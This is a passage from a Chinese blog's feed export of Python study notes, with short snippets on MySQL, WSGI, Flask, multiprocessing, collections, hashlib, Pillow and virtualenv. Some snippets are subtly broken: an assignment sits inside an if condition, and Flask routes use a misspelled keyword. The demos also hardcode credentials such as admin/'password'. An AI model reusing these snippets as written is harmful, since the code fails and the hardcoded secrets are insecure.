python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># MySQL常用引擎是InnoDB</span></span><br><span class="line">mysql -u root -p   <span class="comment"># 登陆</span></span><br><span class="line">show variables like <span class="string">'%char%'</span>;   <span class="comment"># 检查编码格式,推荐在配置文件中设置为utf8mb4</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> mysql <span class="keyword">import</span> connector</span><br><span class="line">conn = connector.connect(user=<span class="string">'root'</span>,password=<span class="string">'pass'</span>,database=<span class="string">'test'</span>)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line">cursor.execute(<span class="string">'sql'</span>)</span><br><span class="line"><span class="comment"># 其他操作与SQLite使用相同</span></span><br><span class="line"><span class="comment"># (不同点):MySQL的SQL占位符是%s</span></span><br></pre></td></tr></table></figure><h4 id="使用SQLAlchemy"><a href="#使用SQLAlchemy" class="headerlink" title="使用SQLAlchemy"></a>使用SQLAlchemy</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SQLAlchemy是python中最著名的ORM（Object Relationship Mapping）框架</span></span><br><span class="line"><span class="comment"># ORM框架的作用就是把数据库表的一行记录与一个对象互相做自动转换</span></span><br><span class="line"><span class="comment"># pip install sqlalchemy</span></span><br></pre></td></tr></table></figure><p><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017803857459008" target="_blank" rel="external nofollow noopener noreferrer">重新学习SQLAIchemy</a></p><h4 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">    h1 &#123;</span><br><span class="line"><span class="css">      <span class="selector-tag">color</span>: <span class="selector-id">#333333</span>;</span></span><br><span class="line">      font-size: 48px;</span><br><span class="line"><span class="css">      <span class="selector-tag">text-shadow</span>: 3<span class="selector-tag">px</span> 3<span class="selector-tag">px</span> 3<span class="selector-tag">px</span> <span class="selector-id">#666666</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.getElementsByTagName(<span class="string">'h1'</span>)[<span class="number">0</span>].style.color = <span class="string">'#ff0000'</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span> <span class="attr">onclick</span>=<span class="string">"change()"</span>&gt;</span>Hello, world!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="WSGI接口"><a href="#WSGI接口" class="headerlink" title="WSGI接口"></a>WSGI接口</h4><ul><li>Web Server Gateway Interface</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">application</span><span class="params">(environ, start_response)</span>:</span></span><br><span class="line">    start_response(<span class="string">'200 OK'</span>, [(<span class="string">'Content-Type'</span>, <span class="string">'text/html'</span>)])  <span class="comment"># headers</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="string">b'&lt;h1&gt;Hello, web!&lt;/h1&gt;'</span>]   <span class="comment"># body</span></span><br><span class="line"><span class="comment"># environ：一个包含所有HTTP请求信息的dict对象</span></span><br><span class="line"><span class="comment"># start_response：一个发送HTTP响应的函数，headers</span></span><br><span class="line"><span class="comment"># application()函数必须由WSGI服务器来调用</span></span><br><span class="line"><span class="comment"># environ['PATH_INFO'][1:]  # [1:]是为了去掉/</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 认识原理,此代码不具有实用价值  # 处理不同HTTP方法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">application</span><span class="params">(environ, start_response)</span>:</span></span><br><span class="line">    method = environ[<span class="string">'REQUEST_METHOD'</span>]</span><br><span class="line">    path = environ[<span class="string">'PATH_INFO'</span>]</span><br><span class="line">    <span class="keyword">if</span> method==<span class="string">'GET'</span> <span class="keyword">and</span> path==<span class="string">'/'</span>:</span><br><span class="line">        <span class="keyword">return</span> handle_home(environ, start_response)</span><br><span class="line">    <span class="keyword">if</span> method==<span class="string">'POST'</span> <span class="keyword">and</span> path=<span class="string">'/signin'</span>:</span><br><span class="line">        <span class="keyword">return</span> handle_signin(environ, start_response)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><h4 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line">app = Flask(__name__)  <span class="comment"># 创建app</span></span><br><span class="line"><span class="meta">@app.route('/',methed=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h1&gt;Home&lt;/h1&gt;'</span></span><br><span class="line"><span class="meta">@app.route('/signin',methed=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signin_form</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'''&lt;form action="/signin" method="post"&gt;</span></span><br><span class="line"><span class="string">              &lt;p&gt;&lt;input name="username"&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">              &lt;p&gt;&lt;input name="password" type="password"&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">              &lt;p&gt;&lt;button type="submit"&gt;Sign In&lt;/button&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">              &lt;/form&gt;'''</span></span><br><span class="line"><span class="meta">@app.route('/signin', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signin</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.form[<span class="string">'username'</span>]==<span class="string">'admin'</span> <span class="keyword">and</span> request.form[<span class="string">'password'</span>]==<span class="string">'password'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;h3&gt;Hello, admin!&lt;/h3&gt;'</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h3&gt;Bad username or password.&lt;/h3&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;socket&quot;&gt;&lt;a href=&quot;#socket&quot; class=&quot;headerlink&quot; title=&quot;socket&quot;&gt;&lt;/a&gt;socket&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;TCP&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight python&quot;&gt;
      
    
    </summary>
    
    
      <category term="Beethoven" scheme="http://spiderblog.cn/categories/Beethoven/"/>
    
    
      <category term="Beethoven" scheme="http://spiderblog.cn/tags/Beethoven/"/>
    
  </entry>
  
  <entry>
    <title>Beethoven</title>
    <link href="http://spiderblog.cn/Beethoven.html"/>
    <id>http://spiderblog.cn/Beethoven.html</id>
    <published>2020-01-15T11:26:30.000Z</published>
    <updated>2020-02-04T06:55:45.530Z</updated>
    
    <content type="html"><![CDATA[<h4 id="os"><a href="#os" class="headerlink" title="os"></a>os</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.getpid()</span><br><span class="line">os.getppid()</span><br></pre></td></tr></table></figure><h4 id="multiprocessing"><a href="#multiprocessing" class="headerlink" title="multiprocessing"></a>multiprocessing</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 部署分布式（master）</span></span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line">task_queue = queue.Queue()  <span class="comment"># 队列，后面会通过BaseManager封装，注册到网络上</span></span><br><span class="line"><span class="keyword">from</span> multiprocessing.managers <span class="keyword">import</span> BaseManager</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QueueManager</span><span class="params">(BaseManager)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">QueueManager.register(<span class="string">'get_task_queue'</span>, callable=<span class="keyword">lambda</span>: task_queue)  <span class="comment"># 必须注册</span></span><br><span class="line">manager = QueueManager(address=(<span class="string">''</span>, <span class="number">5000</span>), authkey=<span class="string">b'abc'</span>)</span><br><span class="line">task = manager.get_task_queue()  <span class="comment"># 获取队列queue</span></span><br><span class="line">manager.start()  <span class="comment"># 开启</span></span><br><span class="line">manager.shutdown()  <span class="comment"># 关闭</span></span><br><span class="line"><span class="comment"># slave</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QueueManager</span><span class="params">(BaseManager)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">QueueManager.register(<span class="string">'get_task_queue'</span>)  <span class="comment"># 一定要注册</span></span><br><span class="line">m = QueueManager(address=(master_ip, <span class="number">5000</span>), authkey=<span class="string">b'abc'</span>)</span><br><span class="line">m.connect()</span><br><span class="line">task = m.get_task_queue()</span><br></pre></td></tr></table></figure><h4 id="threading"><a href="#threading" class="headerlink" title="threading"></a>threading</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">threading.current_thread().name</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Lock</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> local</span><br></pre></td></tr></table></figure><h4 id="datetime"><a href="#datetime" class="headerlink" title="datetime"></a>datetime</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line">now = datetime.now()</span><br><span class="line">now.timestamp() <span class="comment"># 时间戳</span></span><br><span class="line">datetime.fromtimestamp(<span class="number">1429417200.0</span>)</span><br><span class="line">datetime.utcfromtimestamp(<span class="number">1429417200.0</span>)</span><br><span class="line">now.strftime(<span class="string">'%Y-%m-%d %H:%M:%S %A'</span>)</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> timedelta</span><br><span class="line">datetime.now() + timedelta(days=<span class="number">2</span>, hours=<span class="number">12</span>)</span><br><span class="line"><span class="comment"># 设置时区</span></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> timezone</span><br><span class="line">now.replace(tzinfo=timezone(timedelta(hours=<span class="number">8</span>)))</span><br></pre></td></tr></table></figure><h4 id="collections"><a href="#collections" class="headerlink" title="collections"></a>collections</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 具名元组</span></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</span><br><span class="line">Point = namedtuple(<span class="string">'Point'</span>, [<span class="string">'x'</span>, <span class="string">'y'</span>])</span><br><span class="line">p = Point(<span class="number">1</span>, <span class="number">2</span>)  <span class="comment"># 使用 p.x</span></span><br><span class="line"><span class="comment"># 队列，等价于list；更高效</span></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="comment"># 默认字典，等价于dict；key不存在，返回默认值，不报错</span></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line">dd = defaultdict(<span class="keyword">lambda</span>: <span class="string">'N/A'</span>)</span><br><span class="line"><span class="comment"># 有序字典</span></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> OrderedDict</span><br><span class="line">od = OrderedDict([(<span class="string">'a'</span>, <span class="number">1</span>), (<span class="string">'b'</span>, <span class="number">2</span>), (<span class="string">'c'</span>, <span class="number">3</span>)])</span><br><span class="line"><span class="comment"># ChainMap</span></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> ChainMap</span><br></pre></td></tr></table></figure><h4 id="ChainMap"><a href="#ChainMap" class="headerlink" title="ChainMap"></a>ChainMap</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> ChainMap</span><br><span class="line">combined = ChainMap(dict1, dict2, defaults)   <span class="comment"># 链式dict</span></span><br></pre></td></tr></table></figure><h4 id="Counter"><a href="#Counter" class="headerlink" title="Counter"></a>Counter</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"><span class="comment"># 计数器</span></span><br><span class="line">c = Counter()</span><br><span class="line">c.update(<span class="string">'hello'</span>)</span><br></pre></td></tr></table></figure><h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">base64.b64encode(<span class="string">b"abcde"</span>)   <span class="comment"># b'YWJjZGU='  编码</span></span><br><span class="line">base64.b64decode(<span class="string">b'YWJjZGU='</span>)     <span class="comment"># b'abcde'   解码</span></span><br><span class="line"><span class="comment"># Base64是一种任意二进制到文本字符串的编码方法，常用于在URL、Cookie、网页中传输少量二进制数据</span></span><br></pre></td></tr></table></figure><h4 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment"># 转化为bytes</span></span><br><span class="line">struct.pack(<span class="string">'&gt;I'</span>,<span class="number">10240099</span>)   <span class="comment"># b'\x00\x9c@c'</span></span><br><span class="line"><span class="comment"># 转化为python数据</span></span><br><span class="line">struct.unpack(<span class="string">'&gt;IH'</span>, <span class="string">b'\xf0\xf0\xf0\xf0\x80\x80'</span>)   <span class="comment"># (4042322160, 32896)</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">I：<span class="number">4</span>字节无符号整数,即unsigned int</span><br><span class="line">H：<span class="number">2</span>字节无符号整数,即unsigned short</span><br><span class="line">c: char</span><br></pre></td></tr></table></figure><h4 id="hashlib"><a href="#hashlib" class="headerlink" title="hashlib"></a>hashlib</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">md5 = hashlib.md5()   <span class="comment">#</span></span><br><span class="line">md5.update(<span class="string">"date"</span>.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">md5.hexdigest()</span><br><span class="line"><span class="comment"># 补充</span></span><br><span class="line">hashlib.sha1()</span><br><span class="line"><span class="comment"># md5:128 bit字节,32位16进制</span></span><br><span class="line"><span class="comment"># sha1: 160 bit, 40位16进制</span></span><br><span class="line">单向计算特性决定了其作用是防篡改，不能用于加密（不能反推明文）</span><br></pre></td></tr></table></figure><h4 id="hmac"><a href="#hmac" class="headerlink" title="hmac"></a>hmac</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line">h = hmac.new(key=<span class="string">b'key'</span>, msg=<span class="literal">None</span>, digestmod=<span class="string">'MD5'</span>)</span><br><span class="line">h.update(msg=<span class="string">b'msg'</span>)</span><br><span class="line">h.hexdigest()</span><br></pre></td></tr></table></figure><h4 id="itertools"><a href="#itertools" class="headerlink" title="itertools"></a>itertools</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">itertools.count(start=<span class="number">0</span>, step=<span class="number">1</span>)  <span class="comment"># 无限迭代器</span></span><br><span class="line">itertools.cycle(<span class="string">'ABC'</span>)  <span class="comment"># iterable 无限重复</span></span><br><span class="line">itertools.repeat(object [,times])</span><br><span class="line">itertools.takewhile(<span class="keyword">lambda</span> x: x &lt;= <span class="number">10</span>, natuals) </span><br><span class="line">itertools.chain(*iterables)  <span class="comment"># 合并成一个迭代器</span></span><br></pre></td></tr></table></figure><h4 id="contextlib"><a href="#contextlib" class="headerlink" title="contextlib"></a>contextlib</h4><ul><li>上下文管理</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__enter__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self   <span class="comment"># 非常重要，一定要返回一个对象，一般返回self</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__exit__</span><span class="params">(self, exc_type, exc_value, traceback)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> exc_type:</span><br><span class="line">            print(<span class="string">"ERROR处理"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"NO ERROR"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"this is a test class.it is &#123;&#125;"</span>.format(self.name))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> Test(<span class="string">'Bob'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.test()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @contextmanager用法一</span></span><br><span class="line"><span class="keyword">from</span> contextlib <span class="keyword">import</span> contextmanager</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Query</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Query info about %s...'</span> % self.name)</span><br><span class="line"><span class="meta">@contextmanager</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_query</span><span class="params">(name)</span>:</span></span><br><span class="line">    print(<span class="string">'Begin'</span>)</span><br><span class="line">    q = Query(name)</span><br><span class="line">    <span class="keyword">yield</span> q</span><br><span class="line">    print(<span class="string">'End'</span>)</span><br><span class="line"><span class="keyword">with</span> create_query(<span class="string">'Bob'</span>) <span class="keyword">as</span> q:</span><br><span class="line">    q.query()</span><br><span class="line"><span class="comment"># 用法二</span></span><br><span class="line"><span class="meta">@contextmanager</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tag</span><span class="params">(name)</span>:</span></span><br><span class="line">    print(<span class="string">"&lt;%s&gt;"</span> % name)</span><br><span class="line">    <span class="keyword">yield</span></span><br><span class="line">    print(<span class="string">"&lt;/%s&gt;"</span> % name)</span><br><span class="line"><span class="keyword">with</span> tag(<span class="string">"h1"</span>):</span><br><span class="line">    print(<span class="string">"hello"</span>)</span><br><span class="line">    print(<span class="string">"world"</span>)</span><br></pre></td></tr></table></figure><h4 id="Pillow"><a href="#Pillow" class="headerlink" title="Pillow"></a>Pillow</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im = Image.open(<span class="string">'test.jpg'</span>)  <span class="comment"># 读取图片</span></span><br><span class="line">w, h = im.size   <span class="comment"># 图像尺寸</span></span><br><span class="line">im.thumbnail((w//<span class="number">2</span>, h//<span class="number">2</span>))   <span class="comment"># 缩小</span></span><br><span class="line">im.save(<span class="string">'thumbnail.jpg'</span>, <span class="string">'jpeg'</span>)  <span class="comment"># 保存</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"><span class="comment"># 生成验证码</span></span><br><span class="line"><span class="comment"># 图片大小，字体类型，字内容，字大小，字</span></span><br><span class="line">image = Image.new(<span class="string">'RGB'</span>, (<span class="number">60</span> * <span class="number">4</span>, <span class="number">60</span>), (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>))  <span class="comment"># 创建图片</span></span><br><span class="line">draw = ImageDraw.Draw(image)  <span class="comment"># 操作对象</span></span><br><span class="line">draw.point((<span class="number">50</span>, <span class="number">50</span>), fill=(<span class="number">100</span>, <span class="number">100</span>, <span class="number">100</span>))  <span class="comment"># 修改一个像素点</span></span><br><span class="line">font = ImageFont.truetype(<span class="string">'Arial.ttf'</span>, <span class="number">36</span>)  <span class="comment"># 指定字体类型和大小</span></span><br><span class="line">draw.text((<span class="number">60</span>, <span class="number">10</span>), <span class="string">"A"</span>, font=font, fill=(<span class="number">90</span>, <span class="number">90</span>, <span class="number">90</span>))  <span class="comment"># 写入一个“A”</span></span><br><span class="line">image.save(<span class="string">'code.jpg'</span>, <span class="string">'jpeg'</span>)</span><br></pre></td></tr></table></figure><h4 id="chardet"><a href="#chardet" class="headerlink" title="chardet"></a>chardet</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 猜测bytes到str,的编码规则：utf8,ascii等各种编码格式，包括日语韩语等</span></span><br><span class="line">chardet.detect(<span class="string">b'Hello, world!'</span>)</span><br></pre></td></tr></table></figure><h4 id="psutil"><a href="#psutil" class="headerlink" title="psutil"></a>psutil</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 运维</span></span><br><span class="line"><span class="keyword">import</span> psutil</span><br><span class="line">psutil.cpu_count()  <span class="comment"># CPU逻辑数量 4个</span></span><br><span class="line">psutil.cpu_count(logical=<span class="literal">False</span>)  <span class="comment"># CPU物理核心 2个</span></span><br><span class="line"><span class="comment"># 2说明是双核超线程(1个物理核心对应2个逻辑), 4则是4核非超线程</span></span><br></pre></td></tr></table></figure><p><a href="https://github.com/giampaolo/psutil#example-usages" target="_blank" rel="external nofollow noopener noreferrer">psutil-example</a></p><h4 id="virtualenv"><a href="#virtualenv" class="headerlink" title="virtualenv"></a>virtualenv</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir myproject</span><br><span class="line">cd myproject/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 创建一个独立的Python运行环境，命名为venv</span></span><br><span class="line">virtualenv --no-site-packages venv    # 会出现文件夹venv</span><br><span class="line">source venv/bin/activate  # 进入该环境，成功命令提示符前面会出现(venv)</span><br><span class="line">deactivate  # 退出该环境</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;os&quot;&gt;&lt;a href=&quot;#os&quot; class=&quot;headerlink&quot; title=&quot;os&quot;&gt;&lt;/a&gt;os&lt;/h4&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span
      
    
    </summary>
    
    
      <category term="Beethoven" scheme="http://spiderblog.cn/categories/Beethoven/"/>
    
    
      <category term="Beethoven" scheme="http://spiderblog.cn/tags/Beethoven/"/>
    
  </entry>
  
  <entry>
